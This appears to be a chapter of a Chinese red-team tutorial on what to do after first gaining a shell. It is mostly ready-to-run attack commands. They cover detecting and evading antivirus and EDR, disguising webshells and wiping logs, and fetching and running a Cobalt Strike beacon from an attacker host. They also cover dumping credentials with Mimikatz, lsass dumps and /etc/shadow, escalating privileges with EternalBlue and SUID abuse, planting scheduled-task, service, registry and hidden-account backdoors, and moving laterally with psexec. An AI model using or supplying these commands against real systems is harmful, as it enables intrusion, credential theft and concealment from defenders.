# 第七章 初次访问控制—— 进去之后先稳住

> 第7章 | 预计学习时间：4小时 | 难度：⭐⭐⭐

## 📖 写在前面

前面我们讲了怎么打点，讲了怎么从外网打进去。这一章我们来讲——打进去之后该干啥。

很多新手好不容易打进去了，拿到个WebShell，兴奋得不行，然后就不知道干啥了。或者一顿乱操作，结果把Shell搞没了，或者被管理员发现了，功亏一篑。

我给你讲个真实的故事：

有一次护网，有个新手红队队员打进去了一台服务器。他用SQL注入拿到了WebShell，很兴奋。

然后他就开始操作了：
- 先敲个whoami，发现是普通用户
- 然后直接用Mimikatz抓密码
- 抓到了好几个账号，其中有个administrator
- 他很开心，想用这个账号远程登录
- 但是administrator账号的密码太复杂，他没记住
- 他就把密码hash保存了下来
- 然后他想着"管理员密码太复杂了，改个简单的吧"
- 他用net user命令把administrator的密码改了

结果呢？

管理员第二天登录发现登录不上，一查日志发现有异常操作，再一查发现密码被改了。

然后全公司大检查，发现了入侵痕迹，整个目标都被清理了。

**你说，这个红队是不是蠢到家了？**

打进去只是第一步，**稳住、藏好、活下去，才是最重要的。**

这一章我们就来聊聊，拿到初始权限之后，怎么稳住阵脚，怎么藏好自己，怎么为下一步的内网渗透做准备。

坐稳了，我们开讲。

## 7.1 拿到Shell了，然后呢？

### 7.1.1 新手常犯的错

我见过很多新手，费了九牛二虎之力，终于拿到一个Shell了，然后就不知道怎么干了。

还有的新手呢，太急了，一拿到Shell就开始乱搞：
- 先敲个whoami看看权限
- 再敲个ipconfig看看IP
- 然后net user加个管理员账号
- 然后开3389远程桌面
- 然后传个CS马上去...

一顿操作猛如虎，结果呢？
- 动静太大了，触发了告警
- 马儿被杀软干掉了
- 或者管理员发现了
- Shell没了，功亏一篑

**为什么会这样？因为太急了，动静太大了，打草惊蛇了。**

### 7.1.2 红队的思路：先稳后攻

红队的思路是：**先稳住，再进攻。**

拿到Shell之后，别急着搞事情，先看看环境，看看安全不安全，有没有被发现的风险，然后再一步步来。

就像打仗一样：你好不容易撕开了一个口子，打进城了，第一件事不是到处乱跑，是先找个地方建立阵地，稳住阵脚，然后再往里打。

### 7.1.3 拿到Shell后的正确步骤

拿到Shell之后，大概按这个顺序来：

```
第一步：先观察，别乱动
  • 看看自己是什么权限
  • 看看是什么系统
  • 看看有哪些用户
  • 看看有没有杀软、EDR
  • 先收集信息，什么都别改，什么都别加

第二步：藏好自己
  • 把马藏得深一点
  • 改改文件名、路径
  • 找个不起眼的位置

第三步：上传C2马，建立控制
  • 把CS马传上去
  • 让它上线
  • 确认稳定了再操作

第四步：信息收集
  • 收集本机信息
  • 收集网络信息
  • 收集凭据信息

第五步：权限提升
  • 如果权限不够，提权

第六步：权限维持（可选）
  • 如果需要长期控制，留个后门

第七步：横向移动
  • 往其他机器打
```

## 7.2 第一步：先观察

### 7.2.1 看看自己是什么权限

拿到Shell第一件事，先看看自己是什么权限。

**Windows下：**
```bash
whoami          # 当前用户
whoami /priv   # 当前用户的权限
whoami /groups # 当前用户的组

# 查看是否是管理员
net localgroup administrators
```

**Linux下：**
```bash
whoami          # 当前用户
id              # UID、GID、所属组
sudo -l        # 看看有哪些sudo权限
```

如果是普通用户权限，不要急着提权，先收集信息。

如果是System权限（Windows）或Root权限（Linux），那就可以直接干很多事情了。

### 7.2.2 看看是什么系统

**Windows下：**
```bash
systeminfo          # 系统详细信息
hostname           # 主机名
echo %PROCESSOR_ARCHITECTURE%  # CPU架构
ver                # Windows版本
```

**Linux下：**
```bash
cat /etc/os-release      # 操作系统版本
uname -a                 # 内核版本
hostname                # 主机名
cat /proc/version        # 进程信息
```

### 7.2.3 看看有没有杀软/EDR

这个很重要！如果机器上有杀软/EDR，你传的马可能直接就被干掉了。

**Windows下查看杀软：**
```bash
# 方法一：WMIC
wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName /format:list

# 方法二：PowerShell
Get-MpComputerStatus

# 方法三：注册表
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender"
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows Defender"

# 方法四：进程列表
tasklist /svc | findstr -i antivirus
tasklist | findstr -i "msmpeng" "nissetv" "avast" "kaspersky"
```

**Linux下查看杀软：**
```bash
ps aux | grep -i "clamav" "malware" "lynis"
ls -la /var/lib/security/
```

**常见的Windows杀软进程名：**
```
Windows Defender: MsMpEng.exe, msmpeng.exe
360安全卫士: 360tray.exe, 360safe.exe
360杀毒: kavstart.exe
腾讯电脑管家: qqpcrtp.exe, tmiex.exe
火绒: HipsTray.exe, HipsDaemon.exe
卡巴斯基: avp.exe, ksde.exe
诺顿: NortonSecurity.exe, ccSvcHst.exe
迈克菲: mcshield.exe, mcuihost.exe
ESET: ekrn.exe
```

### 7.2.4 看看有没有EDR/HIDS

EDR（端点检测与响应）和HIDS（主机入侵检测系统）比杀软更难对付。

**常见的EDR进程：**
```
Carbon Black: cb.exe, repmgr.exe
CrowdStrike: cs.exe, csagent.exe
SentinelOne: sentinel-agent.exe, SentinelService.exe
Cylance: CylanceSvc.exe, CylanceUI.exe
Tanium: TaniumClient.exe
Sophos: sophos_independent.exe, SAVService.exe
```

**怎么判断有没有EDR？**
```bash
# 看有没有EDR的驱动（内核级EDR会用驱动）
ls -la /windows/system32/drivers/

# 看事件日志有没有EDR相关的事件
wevtutil qe Security /c:10 /f:text | findstr -i "EDR" "defender" "carbon"

# 看有没有EDR的注册表项
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f "EDR"
```

### 7.2.5 看看网络情况

**Windows下：**
```bash
ipconfig /all           # 网络配置
route print             # 路由表
netstat -ano            # 网络连接
arp -a                  # ARP缓存
```

**Linux下：**
```bash
ifconfig -a             # 网络接口
ip addr                 # IP地址
netstat -tulnp          # 监听端口
ss -tulnp               # 监听端口
arp -a                  # ARP缓存
route -n                # 路由表
```

看看这台机器在哪个网段，能不能访问其他机器。

## 7.3 第二步：藏好自己

### 7.3.1 改改WebShell的名字

如果你是从WebShell进来的，先把WebShell的名字改一改。

别用：
- shell.aspx
- cmd.aspx
- hack.aspx
- test.aspx

用：
- 404.aspx
- error.aspx
- common.aspx
- _common.aspx
- data.aspx
- images.aspx

改到不起眼的目录里，别放在根目录。

### 7.3.2 找找正常的WebShell

有些CMS有正常的文件管理功能，可以利用那个功能来管理文件，比自己传WebShell安全。

### 7.3.3 清理日志（可选）

如果时间充裕，可以考虑清理一下日志，但这个操作本身也会产生日志，慎用。

**Windows日志清理：**
```bash
# 查看日志
wevtutil el                    # 列出所有日志

# 清除特定日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# 或者只清除特定时间段的日志（需要脚本）
```

**Linux日志清理：**
```bash
# 查看日志
ls -la /var/log/

# 清除日志
echo "" > /var/log/xxx.log
# 或者
> /var/log/xxx.log

# 清除命令历史
history -c
rm -rf ~/.bash_history
```

### 7.3.4 别改系统配置

别改系统配置！别改系统配置！别改系统配置！

重要的事情说三遍。

很多新手喜欢：
- net user加账号
- net localgroup加管理员
- 开3389端口
- 改注册表

这些都是高危操作，很容易被发现。

**正确做法是：**
- 用已有的账号
- 用已有的服务
- 不改任何系统配置
- 除非确认安全了再动

## 7.4 第三步：上传C2马

### 7.4.1 先做好免杀

在上传C2马之前，先确认免杀做好了。

没有免杀的马，上传上去就会被杀软干掉。

关于免杀的内容，我们后面有专门的章节讲。

### 7.4.2 上传CS马

免杀做好之后，就可以上传CS马了。

**用WebShell上传：**
- 找到文件上传功能
- 上传CS马
- 记住路径

**用命令行上传：**
- 如果是菜刀/蚁剑Shell，可以直接用命令上传
- 如果是冰蝎Shell，有文件管理功能

```bash
# Windows下下载文件
certutil -urlcache -split -f http://你的IP/beacon.exe beacon.exe

# PowerShell下载
powershell -c "IEX (New-Object Net.WebClient).DownloadFile('http://你的IP/beacon.exe', 'beacon.exe')"

# Linux下下载文件
wget http://你的IP/beacon -O beacon
curl http://你的IP/beacon -o beacon
```

### 7.4.3 让马儿上线

上传完之后，运行它。

```bash
# Windows
start beacon.exe
# 或者
./beacon.exe
```

然后回CS里看看，马儿上线了没有。

如果马儿上线了，恭喜你，这台机器就彻底被你控制了。

### 7.4.4 给马儿藏个家

让马儿上线之后，别让它在C盘根目录或者下载目录里待着，找个不起眼的位置。

比如：
- C:\Windows\System32\（系统目录，不容易被清理）
- C:\Windows\Temp\（临时目录，一般没人管）
- C:\ProgramData\（程序数据目录）
- C:\Program Files\xxx\（软件安装目录）

也可以伪装成系统文件，或者正常软件的一部分。

## 7.5 第四步：信息收集

### 7.5.1 本机信息收集

**Windows信息收集命令：**
```bash
# 系统信息
systeminfo
hostname

# 用户信息
whoami
whoami /priv
whoami /groups
net user                    # 本地用户
net user xxx                # 某个用户的详细信息
net localgroup administrators   # 管理员组
query user                  # 当前登录的用户

# 进程和服务
tasklist                    # 进程列表
tasklist /svc              # 进程和服务对应关系
sc query                   # 服务列表
sc queryex type=service     # 详细服务列表

# 网络信息
ipconfig /all
netstat -ano
route print
arp -a

# 防火墙状态
netsh firewall show state
netsh advfirewall show allprofiles

# 共享文件夹
net share
```

**Linux信息收集命令：**
```bash
# 系统信息
uname -a
cat /etc/os-release
hostname

# 用户信息
whoami
id
cat /etc/passwd
cat /etc/shadow
sudo -l

# 进程和服务
ps aux
ps -ef
systemctl list-units --type=service
service --status-all

# 网络信息
ifconfig / ip addr
netstat -tulnp / ss -tulnp
route -n
arp -a

# 防火墙
iptables -L
ufw status

# 计划任务
crontab -l
ls -la /etc/cron.d/
cat /etc/crontab
```

### 7.5.2 内网信息收集

看看这台机器在内网里能访问什么。

**判断是否在域环境：**
```bash
# Windows
net view /domain
systeminfo | findstr /i "domain"

# Linux
realmjoin-rac
cat /etc/resolv.conf
```

**内网扫描（谨慎使用！）：**
```bash
# Windows - ARP扫描
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | findstr "TTL"

# Linux - 内网扫描（推荐使用nmap，但要谨慎）
nmap -sn 192.168.1.0/24

# 或者用PowerView（更隐蔽）
powershell -c "IEX (IWR -UseBasicParsing https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1); Get-NetComputers"
```

**内网资源发现：**
```bash
# Windows
net view                        # 域内机器列表
net view /domain                # 域列表
net view /domain:xxx            # 域内机器列表
net time                       # 时间服务器
net session                    # 会话列表

# Linux
smbclient -L //IP/ -N         # SMB共享列表
rpcclient -U "" -N IP          # RPC查询
```

### 7.5.3 凭据收集

凭据是最重要的！拿到凭据就能横向移动。

**Windows凭据收集：**
```bash
# 方法一：Mimikatz（最常用）
# 上传Mimikatz，然后执行：
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# 方法二：SAM数据库
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# 下载这两个文件，然后在本地用Mimikatz解析

# 方法三：LSASS进程
procdump -ma lsass.exe lsass.dmp
# 下载dmp文件，然后在本地用Mimikatz解析

# 方法四：凭据管理器
cmdkey /list

# 方法五：Cached Credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Linux凭据收集：**
```bash
# 查看shadow文件（需要root）
cat /etc/shadow

# 查看其他用户的SSH密钥
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys

# 查看历史命令
history

# 查看内存中的密码（需要工具）
cat /proc/meminfo | grep passwords
```

## 7.6 第五步：权限提升

如果当前权限不够（比如是普通用户权限），就需要提权。

### 7.6.1 Windows提权

**方法一：系统漏洞提权**

查看系统打了哪些补丁：
```bash
systeminfo | findstr /i "KB"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

对比漏洞：
- 没打KB4012212 → 可能MS17-010（永恒之蓝）
- 没打KB4012215 → 可能MS17-010
- ...

**方法二：利用漏洞提权**

```bash
# 永恒之蓝（MS17-010）
# 用metasploit
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 目标IP
run

# 或者用漏洞利用工具
python3 ms17-010.py 目标IP
```

**方法三：服务配置错误提权**

```bash
# 查看可被利用的服务
powershell -c "IEX (IWR -UseBasicParsing https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1); Invoke-AllChecks"

# 或者用winpeas
winpeas.exe
```

常见配置错误：
- Unquoted Service Paths（服务路径没引号）
- Weak Service Permissions（服务权限配置错误）
- AlwaysInstallElevated（注册表允许普通用户安装MSI）

**方法四：令牌窃取**

如果机器上有高权限用户的token，可以窃取：
```bash
# 用meterpreter
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

### 7.6.2 Linux提权

**方法一：内核漏洞提权**

```bash
# 查看内核版本
uname -a
cat /etc/os-release

# 搜索漏洞
searchsploit "Linux Kernel" 版本号

# 常用提权EXP
# Dirty COW (CVE-2016-5195)
# Sudo Bypass (CVE-2019-14287)
# Sudo Buffer Overflow (CVE-2019-18634)
```

**方法二：SUID提权**

```bash
# 查找有SUID权限的程序
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# 常见的可提权SUID程序
nmap, vim, less, more, bash, perl, python, ruby, g++
# 如果这些程序有SUID权限，可以利用
```

**方法三：Sudo配置错误**

```bash
# 查看当前用户的sudo权限
sudo -l

# 如果有ALL权限
sudo su -

# 如果有某个程序的sudo权限
sudo 某个程序
```

**方法四：计划任务提权**

```bash
# 查看计划任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# 如果有以root运行的计划任务，且我们能写脚本
```

**方法五：NFS提权**

```bash
# 查看NFS共享
showmount -e IP

# 如果可以访问，且有no_root_squash选项
mount -t nfs IP:/home /tmp/nfs
# 然后在/tmp/nfs里写一个SUID程序
```

## 7.7 第六步：权限维持（可选）

如果需要长期控制这台机器，可以考虑留个后门。

**Windows权限维持方法：**
```bash
# 计划任务后门
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 1 /ru system

# 服务后门
sc create "Windows Service" binpath= "C:\Windows\Temp\backdoor.exe" start= auto type= own

# 注册表后门
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# 账号后门
net user hack$ Password123 /add
net localgroup administrators hack$ /add
```

**Linux权限维持方法：**
```bash
# SSH密钥后门
# 在攻击机生成密钥对
ssh-keygen -t rsa
# 把公钥加到目标的~/.ssh/authorized_keys里

# crontab后门
echo "*/5 * * * * /tmp/backdoor" >> /var/spool/cron/root

# 服务后门
# 修改某个服务让它执行恶意代码

# SSH后门
# 修改sshd配置，加个隐藏账号
```

## 7.8 第七步：横向移动

信息收集做完了，权限也提上去了，接下来就可以横向移动了。

**什么是横向移动？**

简单说就是：从这台机器打到另一台机器。

**怎么横向？**

主要靠凭据。

你在这台机器上抓到了某些账号的密码或者哈希，然后用这些凭据去登录其他机器。

**常见的横向移动方法：**

```bash
# Windows - PsExec
psexec.py DOMAIN/user@targetIP cmd.exe

# Windows - WMI
wmic /node:targetIP process call create "calc.exe"

# Windows - SMB
smbexec.py DOMAIN/user:password@targetIP

# Windows - RDP
xfreerdp /u:user /p:password /v:targetIP

# Linux - SSH
ssh user@targetIP

# Linux - 密码复用
# 用同样的密码试试其他机器
```
